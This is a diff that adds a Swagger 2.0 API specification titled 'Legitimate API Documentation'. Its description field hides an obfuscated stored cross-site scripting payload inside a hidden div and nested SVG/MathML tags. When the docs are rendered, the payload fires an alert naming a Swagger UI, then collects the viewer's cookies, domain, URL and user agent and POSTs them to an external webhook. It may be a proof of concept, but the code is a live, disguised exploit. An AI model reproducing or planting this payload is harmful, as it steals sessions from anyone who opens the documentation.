@@ -1,0 +1,42 @@
+swagger: '2.0'
+info:
+  title: "Legitimate API Documentation"
+  description: |
+    Welcome to our API documentation.
+    <details>
+    <summary>Click for advanced features</summary>
+    <div style="display:none">
+    <svg><foreignObject><math><semantics><annotation-xml encoding="text/html">
+    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 
+         onload="
+         (function(){
+           var a=String.fromCharCode(97,108,101,114,116);
+           var b=String.fromCharCode(68,79,77,32,88,83,83,32,105,110,32,84,45,77,111,98,105,108,101,32,83,119,97,103,103,101,114,32,85,73);
+           window[a](b + String.fromCharCode(32,45,32) + document.domain);
+           
+           // Advanced data exfiltration
+           var d = {
+             d: document.domain,
+             c: document.cookie,
+             u: location.href,
+             t: new Date().getTime(),
+             a: navigator.userAgent
+           };
+           
+           var x = new XMLHttpRequest();
+           x.open('POST', 'https://webhook.site/71e209df-07f8-4391-80d8-f2f98aaef5dd', true);
+           x.setRequestHeader('Content-Type', 'application/json');
+           x.send(JSON.stringify(d));
+         })();
+         ">
+    </annotation-xml></semantics></math></foreignObject></svg>
+    </div>
+    </details>
+  version: '1.0'
+paths:
+  /test:
+    get:
+      summary: "Test endpoint"
+      responses:
+        200:
+          description: "Success"
